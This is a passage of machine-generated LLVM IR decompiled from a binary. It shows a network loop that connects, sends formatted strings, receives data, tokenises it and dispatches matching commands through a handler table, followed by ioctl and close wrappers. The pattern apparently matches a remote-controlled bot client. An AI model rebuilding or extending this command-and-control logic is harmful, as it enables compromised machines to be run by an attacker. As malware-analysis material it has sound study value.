  %v2_10002454 = bitcast i32* %stack_var_-6484 to i8*
  %v3_10002454 = call i32 @strcat(i8* %v2_10002454, i32 %v2_1000242c)
  store i32 %v2_10002438, i32* @global_var_1001d834.289, align 4
  store i32 268444776, i32* @lr, align 4
  %v2_10002464 = call i32 @makestring(i32 %v3_10002454, i32 268566528)
  store i32 %v2_10002464, i32* @global_var_1001d82c.269, align 4
  store i32 268444792, i32* @lr, align 4
  %v2_10002474 = call i32 @makestring(i32 268566528, i32 %v2_1000242c)
  store i32 %v2_10002474, i32* @global_var_1001d83c.325, align 4
  store i32 ptrtoint (i32* @global_var_1000b95c.326 to i32), i32* @global_var_1001d84c.277, align 4
  store i32 ptrtoint (i32* @global_var_1000b960.327 to i32), i32* @global_var_1001d848.294, align 4
  store i32 ptrtoint (i32* @global_var_1000b960.327 to i32), i32* @global_var_1001d830.328, align 4
  store i32 0, i32* @global_var_1001d840.309, align 4
  %v2_10002534 = ptrtoint i32* %stack_var_-6424 to i32
  %v2_1000258c = ptrtoint i32* %stack_var_-6808 to i32
  %v2_10002590 = add i32 %v2_1000258c, 384
  %v2_100025e8 = ptrtoint i32* %stack_var_-6432 to i32
  %v2_100027fc = ptrtoint i32* %stack_var_-4120 to i32
  %v2_100028e8 = ptrtoint i32* %stack_var_-5144 to i32
  %v2_10002990 = ptrtoint i32* %stack_var_-6168 to i32
  %v2_10002830 = add i32 %v2_1000258c, 2688
  br label %dec_label_pc_100024c4

dec_label_pc_100024c4:                            ; preds = %dec_label_pc_100027f4, %dec_label_pc_10002578, %dec_label_pc_10002a68, %dec_label_pc_100023f4
  store i32 268444872, i32* @lr, align 4
  %v0_100024c4 = call i32 @con()
  %v3_100024cc = load i32, i32* @global_var_1001d838.304, align 4
  %v3_100024d4 = load i32, i32* @global_var_1001d830.328, align 4
  %v6_100024ec = call i32 @Send(i32 %v3_100024cc, i32 ptrtoint ([9 x i8]* @global_var_1000b964.329 to i32), i32 %v3_100024d4, i32 268500992, i32 %v2_100025e8)
  %v3_100024f4 = load i32, i32* @global_var_1001d838.304, align 4
  %v3_100024fc = load i32, i32* @global_var_1001d834.289, align 4
  %v3_10002504 = load i32, i32* @global_var_1001d82c.269, align 4
  %v3_1000250c = load i32, i32* @global_var_1001d83c.325, align 4
  %v7_1000252c = call i32 @Send(i32 %v3_100024f4, i32 ptrtoint ([41 x i8]* @global_var_1000b970.330 to i32), i32 %v3_100024fc, i32 %v3_10002504, i32 %v3_1000250c)
  br label %dec_label_pc_10002534

dec_label_pc_10002534:                            ; preds = %dec_label_pc_100027b4, %dec_label_pc_10002828, %dec_label_pc_10002a88, %dec_label_pc_10002aac, %dec_label_pc_100024c4
  br label %dec_label_pc_10002548

dec_label_pc_10002548:                            ; preds = %dec_label_pc_10002534, %dec_label_pc_10002548
  %storemerge1428 = phi i32 [ 0, %dec_label_pc_10002534 ], [ %v1_10002564, %dec_label_pc_10002548 ]
  %v1_10002550 = mul nuw nsw i32 %storemerge1428, 4
  %v2_10002554 = add i32 %v1_10002550, %v2_10002534
  %v2_1000255c = inttoptr i32 %v2_10002554 to i32*
  store i32 0, i32* %v2_1000255c, align 4
  %v1_10002564 = add nuw nsw i32 %storemerge1428, 1
  %tmp88 = icmp ult i32 %v1_10002564, 32
  br i1 %tmp88, label %dec_label_pc_10002548, label %dec_label_pc_10002578

dec_label_pc_10002578:                            ; preds = %dec_label_pc_10002548
  %v3_1000257c = load i32, i32* @global_var_1001d838.304, align 4
  %v1_10002580 = udiv i32 %v3_1000257c, 32
  %v1_10002588 = mul nuw nsw i32 %v1_10002580, 4
  %v1_10002594 = add i32 %v1_10002588, %v2_10002590
  %v1_10002598 = inttoptr i32 %v1_10002594 to i32*
  %v2_10002598 = load i32, i32* %v1_10002598, align 4
  %v1_100025a4 = urem i32 %v3_1000257c, 32
  %v3_100025ac = shl i32 1, %v1_100025a4
  %v2_100025b0 = or i32 %v2_10002598, %v3_100025ac
  store i32 %v2_100025b0, i32* %v1_10002598, align 4
  store i32 1200, i32* %stack_var_-6432, align 4
  %v3_100025dc = load i32, i32* @global_var_1001d838.304, align 4
  %v1_100025e0 = add i32 %v3_100025dc, 1
  store i32 268445188, i32* @lr, align 4
  %v6_10002600 = call i32 @__libc_select(i32 %v1_100025e0, i32 %v2_10002534, i32 0, i32 0, i32 %v2_100025e8, i32 %v2_10002534)
  %tmp89 = icmp slt i32 %v6_10002600, 1
  br i1 %tmp89, label %dec_label_pc_100024c4, label %dec_label_pc_100027a0.preheader

dec_label_pc_100027a0.preheader:                  ; preds = %dec_label_pc_10002578
  %v3_100027a433 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_100027ac34 = icmp eq i32 %v3_100027a433, 0
  br i1 %v2_100027ac34, label %dec_label_pc_100027b4, label %dec_label_pc_1000261c

dec_label_pc_1000261c:                            ; preds = %dec_label_pc_100027a0.preheader, %dec_label_pc_10002794
  %storemerge1536 = phi i32 [ %.pre, %dec_label_pc_10002794 ], [ 0, %dec_label_pc_100027a0.preheader ]
  %v1_10002620 = mul i32 %storemerge1536, 4
  %v3_1000262c = load i32, i32* @global_var_1001d850.266, align 4
  %v2_10002630 = add i32 %v3_1000262c, %v1_10002620
  %v1_10002634 = inttoptr i32 %v2_10002630 to i32*
  %v2_10002634 = load i32, i32* %v1_10002634, align 4
  store i32 268445256, i32* @lr, align 4
  %v4_10002644 = call i32 @__libc_waitpid(i32 %v2_10002634, i32 0, i32 1, i32 %v2_10002630)
  %tmp90 = icmp slt i32 %v4_10002644, 1
  %.pre = add i32 %storemerge1536, 1
  br i1 %tmp90, label %dec_label_pc_10002794, label %dec_label_pc_100026ac.preheader

dec_label_pc_100026ac.preheader:                  ; preds = %dec_label_pc_1000261c
  %v3_100026b094 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_100026b895 = icmp ult i32 %.pre, %v3_100026b094
  %v1_1000266896 = mul i32 %.pre, 4
  %v3_1000267497 = load i32, i32* @global_var_1001d850.266, align 4
  %v2_1000267898 = add i32 %v3_1000267497, %v1_1000266896
  br i1 %v2_100026b895, label %dec_label_pc_10002664, label %dec_label_pc_100026c0

dec_label_pc_10002664:                            ; preds = %dec_label_pc_100026ac.preheader, %dec_label_pc_10002664
  %v2_10002678102 = phi i32 [ %v2_10002678, %dec_label_pc_10002664 ], [ %v2_1000267898, %dec_label_pc_100026ac.preheader ]
  %v1_1000265899 = phi i32 [ %v1_10002658, %dec_label_pc_10002664 ], [ %.pre, %dec_label_pc_100026ac.preheader ]
  %v1_1000267c = add i32 %v2_10002678102, -4
  %v1_10002698 = inttoptr i32 %v2_10002678102 to i32*
  %v2_10002698 = load i32, i32* %v1_10002698, align 4
  %v2_1000269c = inttoptr i32 %v1_1000267c to i32*
  store i32 %v2_10002698, i32* %v2_1000269c, align 4
  %v1_10002658 = add i32 %v1_1000265899, 1
  %v3_100026b0 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_100026b8 = icmp ult i32 %v1_10002658, %v3_100026b0
  %v1_10002668 = mul i32 %v1_10002658, 4
  %v3_10002674 = load i32, i32* @global_var_1001d850.266, align 4
  %v2_10002678 = add i32 %v3_10002674, %v1_10002668
  br i1 %v2_100026b8, label %dec_label_pc_10002664, label %dec_label_pc_100026c0

dec_label_pc_100026c0:                            ; preds = %dec_label_pc_10002664, %dec_label_pc_100026ac.preheader
  %v2_10002678.lcssa = phi i32 [ %v2_1000267898, %dec_label_pc_100026ac.preheader ], [ %v2_10002678, %dec_label_pc_10002664 ]
  %v1_100026d8 = add i32 %v2_10002678.lcssa, -4
  %v2_100026e0 = inttoptr i32 %v1_100026d8 to i32*
  store i32 0, i32* %v2_100026e0, align 4
  %v3_100026e8 = load i32, i32* @global_var_1001d824.265, align 4
  %v1_100026ec = add i32 %v3_100026e8, -1
  store i32 %v1_100026ec, i32* @global_var_1001d824.265, align 4
  %v1_10002700 = mul i32 %v1_100026ec, 4
  %v1_10002704 = add i32 %v1_10002700, 4
  store i32 %v1_10002704, i32* @r3, align 4
  store i32 268445456, i32* @lr, align 4
  %v0_1000270c = call i32 @malloc()
  %v3_1000276829 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_1000277030 = icmp eq i32 %v3_1000276829, 0
  br i1 %v2_1000277030, label %dec_label_pc_10002778, label %dec_label_pc_10002724

dec_label_pc_10002724:                            ; preds = %dec_label_pc_100026c0, %dec_label_pc_10002724
  %storemerge2232 = phi i32 [ %v1_1000275c, %dec_label_pc_10002724 ], [ 0, %dec_label_pc_100026c0 ]
  %v1_10002728 = mul i32 %storemerge2232, 4
  %v2_10002734 = add i32 %v1_10002728, %v0_1000270c
  %v3_10002748 = load i32, i32* @global_var_1001d850.266, align 4
  %v2_1000274c = add i32 %v3_10002748, %v1_10002728
  %v1_10002750 = inttoptr i32 %v2_1000274c to i32*
  %v2_10002750 = load i32, i32* %v1_10002750, align 4
  %v2_10002754 = inttoptr i32 %v2_10002734 to i32*
  store i32 %v2_10002750, i32* %v2_10002754, align 4
  %v1_1000275c = add i32 %storemerge2232, 1
  %v3_10002768 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_10002770 = icmp ult i32 %v1_1000275c, %v3_10002768
  br i1 %v2_10002770, label %dec_label_pc_10002724, label %dec_label_pc_10002764.dec_label_pc_10002778_crit_edge

dec_label_pc_10002764.dec_label_pc_10002778_crit_edge: ; preds = %dec_label_pc_10002724
  br label %dec_label_pc_10002778

dec_label_pc_10002778:                            ; preds = %dec_label_pc_100026c0, %dec_label_pc_10002764.dec_label_pc_10002778_crit_edge
  %v3_1000277c = load i32, i32* @global_var_1001d850.266, align 4
  store i32 %v3_1000277c, i32* @r3, align 4
  store i32 268445576, i32* @lr, align 4
  %v0_10002784 = call i32 @free()
  store i32 %v0_1000270c, i32* @global_var_1001d850.266, align 4
  br label %dec_label_pc_10002794

dec_label_pc_10002794:                            ; preds = %dec_label_pc_1000261c, %dec_label_pc_10002778
  %v3_100027a4 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_100027ac = icmp ult i32 %.pre, %v3_100027a4
  br i1 %v2_100027ac, label %dec_label_pc_1000261c, label %dec_label_pc_100027b4

dec_label_pc_100027b4:                            ; preds = %dec_label_pc_100027a0.preheader, %dec_label_pc_10002794
  %v3_100027b8 = load i32, i32* @global_var_1001d838.304, align 4
  %v1_100027bc = udiv i32 %v3_100027b8, 32
  %v1_100027c0 = mul nuw nsw i32 %v1_100027bc, 4
  %v1_100027cc = add i32 %v1_100027c0, %v2_10002590
  %v1_100027d0 = inttoptr i32 %v1_100027cc to i32*
  %v2_100027d0 = load i32, i32* %v1_100027d0, align 4
  %v1_100027dc = urem i32 %v3_100027b8, 32
  %v3_100027e0 = sub i32 0, %v3_100027b8
  %v4_100027e0 = urem i32 %v3_100027e0, 32
  %v5_100027e0 = shl i32 %v2_100027d0, %v4_100027e0
  %v6_100027e0 = xor i32 %v4_100027e0, 31
  %v7_100027e0 = lshr i32 %v2_100027d0, %v6_100027e0
  %v8_100027e0 = udiv i32 %v7_100027e0, 2
  %v9_100027e0 = or i32 %v8_100027e0, %v5_100027e0
  %v12_100027e0 = lshr i32 -1, %v1_100027dc
  %tmp125 = icmp slt i32 %v2_100027d0, 0
  %v15_100027e023 = zext i1 %tmp125 to i32
  %v16_100027e0 = xor i32 %v12_100027e0, 1
  %v17_100027e0 = and i32 %v15_100027e023, %v16_100027e0
  %v14_100027e0 = urem i32 %v12_100027e0, 2
  %v14_100027e0.masked = and i32 %v14_100027e0, %v9_100027e0
  %v1_100027e8 = or i32 %v14_100027e0.masked, %v17_100027e0
  %v3_100027ec = icmp eq i32 %v1_100027e8, 0
  br i1 %v3_100027ec, label %dec_label_pc_10002534, label %dec_label_pc_100027f4

dec_label_pc_100027f4:                            ; preds = %dec_label_pc_100027b4
  store i32 268445716, i32* @lr, align 4
  %v4_10002810 = call i32 @__libc_recv(i32 %v3_100027b8, i32 %v2_100027fc, i32 4096, i32 0)
  store i32 %v4_10002810, i32* %stack_var_-6808, align 4
  %tmp91 = icmp slt i32 %v4_10002810, 1
  br i1 %tmp91, label %dec_label_pc_100024c4, label %dec_label_pc_10002828

dec_label_pc_10002828:                            ; preds = %dec_label_pc_100027f4
  %v3_10002838 = add i32 %v2_10002830, %v4_10002810
  %v4_10002838 = inttoptr i32 %v3_10002838 to i8*
  store i8 0, i8* %v4_10002838, align 1
  store i32 ptrtoint (i32* @global_var_1000b99c.332 to i32), i32* @r4, align 4
  store i32 268445776, i32* @lr, align 4
  %v3_1000284c = call i32 @__GI_strtok(i32 %v2_100027fc, i32 ptrtoint (i32* @global_var_1000b99c.332 to i32), i32 268500992)
  %v3_10002aa450 = icmp eq i32 %v3_1000284c, 0
  br i1 %v3_10002aa450, label %dec_label_pc_10002534, label %dec_label_pc_10002aac

dec_label_pc_1000285c:                            ; preds = %dec_label_pc_10002aac
  store i32 268445796, i32* @lr, align 4
  %v2_10002860 = call i32 @filter(i32 %storemerge52.in)
  %v2_10002868 = load i8, i8* %storemerge52, align 1
  %v3_10002870 = icmp eq i8 %v2_10002868, 58
  br i1 %v3_10002870, label %dec_label_pc_10002890.preheader, label %dec_label_pc_1000291c

dec_label_pc_10002890.preheader:                  ; preds = %dec_label_pc_1000285c
  store i32 0, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_1000289837 = call i32 @__GI_strlen()
  %v2_100028a039 = icmp eq i32 %v0_1000289837, 0
  br i1 %v2_100028a039, label %dec_label_pc_100028c8, label %dec_label_pc_100028a8

dec_label_pc_10002884:                            ; preds = %dec_label_pc_100028a8
  %v1_10002888 = add i32 %v3_100028a8, 1
  store i32 %v1_10002888, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_10002898 = call i32 @__GI_strlen()
  %v2_100028a0 = icmp ult i32 %v1_10002888, %v0_10002898
  br i1 %v2_100028a0, label %dec_label_pc_100028a8, label %dec_label_pc_100028c8

dec_label_pc_100028a8:                            ; preds = %dec_label_pc_10002890.preheader, %dec_label_pc_10002884
  %v3_100028a8 = load i32, i32* %stack_var_-6808, align 4
  %v2_100028b4 = add i32 %v3_100028a8, %storemerge52.in
  %v1_100028b8 = inttoptr i32 %v2_100028b4 to i8*
  %v2_100028b8 = load i8, i8* %v1_100028b8, align 1
  %v3_100028c0 = icmp eq i8 %v2_100028b8, 32
  br i1 %v3_100028c0, label %dec_label_pc_100028c8, label %dec_label_pc_10002884

dec_label_pc_100028c8:                            ; preds = %dec_label_pc_10002890.preheader, %dec_label_pc_10002884, %dec_label_pc_100028a8
  %v3_100028c8 = load i32, i32* %stack_var_-6808, align 4
  %v2_100028d4 = add i32 %v3_100028c8, %storemerge52.in
  %v3_100028dc = inttoptr i32 %v2_100028d4 to i8*
  store i8 0, i8* %v3_100028dc, align 1
  %v1_100028e4 = add i32 %storemerge52.in, 1
  %v2_100028f4 = inttoptr i32 %v1_100028e4 to i8*
  %v3_100028f4 = call i32 @strcpy(i32 %v2_100028e8, i8* %v2_100028f4)
  %v3_100028f8 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002904 = add i32 %v3_100028f8, %storemerge52.in
  %v1_10002908 = add i32 %v2_10002904, 1
  %v3_10002914 = inttoptr i32 %v1_10002908 to i8*
  %v4_10002914 = call i32 @strcpy(i32 %storemerge52.in, i8* %v3_10002914)
  br label %dec_label_pc_10002940.preheader

dec_label_pc_1000291c:                            ; preds = %dec_label_pc_1000285c
  store i32 10752, i32* %stack_var_-5144, align 4
  br label %dec_label_pc_10002940.preheader

dec_label_pc_10002940.preheader:                  ; preds = %dec_label_pc_100028c8, %dec_label_pc_1000291c
  store i32 0, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_1000294842 = call i32 @__GI_strlen()
  %v2_1000295044 = icmp eq i32 %v0_1000294842, 0
  br i1 %v2_1000295044, label %dec_label_pc_10002978, label %dec_label_pc_10002958

dec_label_pc_10002934:                            ; preds = %dec_label_pc_10002958
  %v1_10002938 = add i32 %v3_10002958, 1
  store i32 %v1_10002938, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_10002948 = call i32 @__GI_strlen()
  %v2_10002950 = icmp ult i32 %v1_10002938, %v0_10002948
  br i1 %v2_10002950, label %dec_label_pc_10002958, label %dec_label_pc_10002978

dec_label_pc_10002958:                            ; preds = %dec_label_pc_10002940.preheader, %dec_label_pc_10002934
  %v3_10002958 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002964 = add i32 %v3_10002958, %storemerge52.in
  %v1_10002968 = inttoptr i32 %v2_10002964 to i8*
  %v2_10002968 = load i8, i8* %v1_10002968, align 1
  %v3_10002970 = icmp eq i8 %v2_10002968, 32
  br i1 %v3_10002970, label %dec_label_pc_10002978, label %dec_label_pc_10002934

dec_label_pc_10002978:                            ; preds = %dec_label_pc_10002940.preheader, %dec_label_pc_10002934, %dec_label_pc_10002958
  %v3_10002978 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002984 = add i32 %v3_10002978, %storemerge52.in
  %v3_1000298c = inttoptr i32 %v2_10002984 to i8*
  store i8 0, i8* %v3_1000298c, align 1
  %v4_1000299c = call i32 @strcpy(i32 %v2_10002990, i8* %storemerge52)
  %v3_100029a0 = load i32, i32* %stack_var_-6808, align 4
  %v2_100029ac = add i32 %v3_100029a0, %storemerge52.in
  %v1_100029b0 = add i32 %v2_100029ac, 1
  %v3_100029bc = inttoptr i32 %v1_100029b0 to i8*
  %v4_100029bc = call i32 @strcpy(i32 %storemerge52.in, i8* %v3_100029bc)
  store i32 0, i32* %stack_var_-6808, align 4
  %v2_10002a5c105 = load i32, i32* bitcast ([4 x i8]** @global_var_1001d464.336 to i32*), align 4
  %v3_10002a60108 = icmp eq i32 %v2_10002a5c105, 0
  br i1 %v3_10002a60108, label %dec_label_pc_10002a68, label %dec_label_pc_100029cc

dec_label_pc_100029cc:                            ; preds = %dec_label_pc_10002978, %dec_label_pc_100029cc
  %v1_10002a5c111 = phi i32* [ %v1_10002a5c, %dec_label_pc_100029cc ], [ bitcast ([4 x i8]** @global_var_1001d464.336 to i32*), %dec_label_pc_10002978 ]
  %v2_100029e0 = load i32, i32* %v1_10002a5c111, align 4
  store i32 %v2_100029e0, i32* @r3, align 4
  store i32 %v2_10002990, i32* @r4, align 4
  %v2_100029f0 = call i32 @__GI_strcasecmp(i32 %v2_100029e0, i32 %v2_10002990)
  %v3_10002a00 = load i32, i32* %stack_var_-6808, align 4
  %v1_10002a0c = mul i32 %v3_10002a00, 8
  %v1_10002a14 = add i32 %v1_10002a0c, add (i32 ptrtoint ([4 x i8]** @global_var_1001d464.336 to i32), i32 4)
  %v1_10002a18 = inttoptr i32 %v1_10002a14 to i32*
  %v2_10002a18 = load i32, i32* %v1_10002a18, align 4
  call void @__pseudo_call(i32 %v2_10002a18)
  %v3_10002a3c = load i32, i32* %stack_var_-6808, align 4
  %v1_10002a40 = add i32 %v3_10002a3c, 1
  store i32 %v1_10002a40, i32* %stack_var_-6808, align 4
  %v1_10002a54 = mul i32 %v1_10002a40, 8
  %v2_10002a58 = add i32 %v1_10002a54, ptrtoint ([4 x i8]** @global_var_1001d464.336 to i32)
  %v1_10002a5c = inttoptr i32 %v2_10002a58 to i32*
  %v2_10002a5c = load i32, i32* %v1_10002a5c, align 4
  %v3_10002a60 = icmp eq i32 %v2_10002a5c, 0
  br i1 %v3_10002a60, label %dec_label_pc_10002a68, label %dec_label_pc_100029cc

dec_label_pc_10002a68:                            ; preds = %dec_label_pc_100029cc, %dec_label_pc_10002978
  store i32 %v2_10002990, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000b9a0.337 to i32), i32* @r4, align 4
  %v3_10002a78 = call i32 @__GI_strcasecmp(i32 %v2_10002990, i32 ptrtoint ([6 x i8]* @global_var_1000b9a0.337 to i32))
  %v3_10002a80 = icmp eq i32 %v3_10002a78, 0
  br i1 %v3_10002a80, label %dec_label_pc_100024c4, label %dec_label_pc_10002a88

dec_label_pc_10002a88:                            ; preds = %dec_label_pc_10002a68
  store i32 ptrtoint (i32* @global_var_1000b99c.332 to i32), i32* @r4, align 4
  store i32 268446360, i32* @lr, align 4
  %v3_10002a94 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000b99c.332 to i32), i32 268500992)
  %v3_10002aa4 = icmp eq i32 %v3_10002a94, 0
  br i1 %v3_10002aa4, label %dec_label_pc_10002534, label %dec_label_pc_10002aac

dec_label_pc_10002aac:                            ; preds = %dec_label_pc_10002828, %dec_label_pc_10002a88
  %storemerge52.in = phi i32 [ %v3_10002a94, %dec_label_pc_10002a88 ], [ %v3_1000284c, %dec_label_pc_10002828 ]
  %storemerge52 = inttoptr i32 %storemerge52.in to i8*
  %v2_10002ab0 = load i8, i8* %storemerge52, align 1
  %v3_10002ab8 = icmp eq i8 %v2_10002ab0, 0
  br i1 %v3_10002ab8, label %dec_label_pc_10002534, label %dec_label_pc_1000285c

; uselistorder directives
  uselistorder i8* %storemerge52, { 2, 1, 0 }
  uselistorder i32 %storemerge52.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10002a5c, { 1, 0 }
  uselistorder i32 %v4_100027e0, { 1, 0 }
  uselistorder i32 %v2_100027d0, { 0, 2, 1 }
  uselistorder i32 %v3_100027b8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000275c, { 1, 0 }
  uselistorder i32 %v1_10002728, { 1, 0 }
  uselistorder i32 %storemerge2232, { 1, 0 }
  uselistorder i32 %v0_1000270c, { 1, 0 }
  uselistorder i32 %v1_10002658, { 0, 2, 1 }
  uselistorder i32 %v2_10002678102, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1536, { 1, 0 }
  uselistorder i32 %v3_1000257c, { 1, 0 }
  uselistorder i32 %storemerge1428, { 1, 0 }
  uselistorder i32 %v2_10002990, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_100025e8, { 1, 0 }
  uselistorder i32 %v2_10002534, { 2, 1, 0 }
  uselistorder i32 %v2_1000242c, { 2, 1, 0 }
  uselistorder i32 %v1_100023dc, { 1, 0 }
  uselistorder i32 %v2_1000239c, { 1, 0 }
  uselistorder i32 %storemerge1356, { 1, 0 }
  uselistorder i32 %v3_100022ec, { 1, 0, 2 }
  uselistorder i32 %v2_10002278, { 1, 0, 2 }
  uselistorder i32 %v2_10002250, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10002218, { 0, 2, 1 }
  uselistorder i32 %stack_var_-6756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10002158, { 4, 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-6808, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1001d464.336 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_1001d464.336, { 1, 0 }
  uselistorder i32 (i32)* @filter, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000b99c.332 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001d850.266, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_1001d824.265, { 5, 6, 2, 7, 8, 9, 0, 1, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32 (i32, i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 7, 6, 0, 5, 2, 1, 4, 3 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_10002aac, { 1, 0 }
  uselistorder label %dec_label_pc_100029cc, { 1, 0 }
  uselistorder label %dec_label_pc_10002978, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002958, { 1, 0 }
  uselistorder label %dec_label_pc_10002940.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100028c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100028a8, { 1, 0 }
  uselistorder label %dec_label_pc_100027b4, { 1, 0 }
  uselistorder label %dec_label_pc_10002794, { 1, 0 }
  uselistorder label %dec_label_pc_10002778, { 1, 0 }
  uselistorder label %dec_label_pc_10002724, { 1, 0 }
  uselistorder label %dec_label_pc_10002664, { 1, 0 }
  uselistorder label %dec_label_pc_1000261c, { 1, 0 }
  uselistorder label %dec_label_pc_10002548, { 1, 0 }
  uselistorder label %dec_label_pc_10002534, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100024c4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002388, { 1, 0 }
  uselistorder label %dec_label_pc_1000234c, { 1, 0 }
  uselistorder label %dec_label_pc_10002334, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10002214, { 1, 0 }
  uselistorder label %dec_label_pc_100021b4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_10002ad4 = icmp eq i32 %arg2, -2143521772
  %v2_10002ae8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10002ae8, i32* %stack_var_-32, align 4
  br i1 %v4_10002ad4, label %dec_label_pc_10002b48, label %dec_label_pc_10002b08

dec_label_pc_10002b08:                            ; preds = %entry
  %v3_10002b08 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10002b08, label %dec_label_pc_10002b20, label %dec_label_pc_10002b10

dec_label_pc_10002b10:                            ; preds = %dec_label_pc_10002b08
  %v3_10002b14 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10002b14, label %dec_label_pc_10002b3c, label %dec_label_pc_10002b68

dec_label_pc_10002b20:                            ; preds = %dec_label_pc_10002b08
  %v1_10002b20 = xor i32 %arg2, -2143551488
  %v3_10002b24 = icmp eq i32 %v1_10002b20, 29717
  br i1 %v3_10002b24, label %dec_label_pc_10002b58, label %dec_label_pc_10002b2c

dec_label_pc_10002b2c:                            ; preds = %dec_label_pc_10002b20
  %v3_10002b30 = icmp eq i32 %v1_10002b20, 29718
  br i1 %v3_10002b30, label %dec_label_pc_10002b60, label %dec_label_pc_10002b68

dec_label_pc_10002b3c:                            ; preds = %dec_label_pc_10002b10
  store i32 ptrtoint (i32* @global_var_10002b44.338 to i32), i32* @lr, align 4
  %v1_10002b40 = inttoptr i32 %arg3 to i32*
  %v2_10002b40 = call i32 @__GI_tcgetattr(i32* %v1_10002b40)
  br label %dec_label_pc_10002b50

dec_label_pc_10002b48:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b4c:                            ; preds = %dec_label_pc_10002b60, %dec_label_pc_10002b58, %dec_label_pc_10002b48
  store i32 268446544, i32* @lr, align 4
  %v0_10002b4c = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_10002b50

dec_label_pc_10002b50:                            ; preds = %dec_label_pc_10002b3c, %dec_label_pc_10002b4c
  %storemerge = phi i32 [ %v0_10002b4c, %dec_label_pc_10002b4c ], [ %v2_10002b40, %dec_label_pc_10002b3c ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002b94

dec_label_pc_10002b58:                            ; preds = %dec_label_pc_10002b20
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b60:                            ; preds = %dec_label_pc_10002b2c
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b68:                            ; preds = %dec_label_pc_10002b2c, %dec_label_pc_10002b10
  %v0_10002b78 = call i32 @__asm_mfcr()
  %v1_10002b7c = and i32 %v0_10002b78, 268435456
  %v3_10002b7c = icmp eq i32 %v1_10002b7c, 0
  store i32 %v0_10002b78, i32* %r31.global-to-local, align 4
  br i1 %v3_10002b7c, label %dec_label_pc_10002b94, label %dec_label_pc_10002b88

dec_label_pc_10002b88:                            ; preds = %dec_label_pc_10002b68
  %v0_10002b88 = call i32 @__errno_location()
  %v0_10002b8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10002b8c = inttoptr i32 %v0_10002b88 to i32*
  store i32 %v0_10002b8c, i32* %v2_10002b8c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002b94

dec_label_pc_10002b94:                            ; preds = %dec_label_pc_10002b68, %dec_label_pc_10002b50, %dec_label_pc_10002b88
  %v0_10002b98 = phi i32 [ %v0_10002b78, %dec_label_pc_10002b68 ], [ %storemerge, %dec_label_pc_10002b50 ], [ -1, %dec_label_pc_10002b88 ]
  ret i32 %v0_10002b98

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10002b94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10002b50, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10002bc4 = call i32 @__asm_mfcr()
  %v1_10002bc8 = and i32 %v0_10002bc4, 268435456
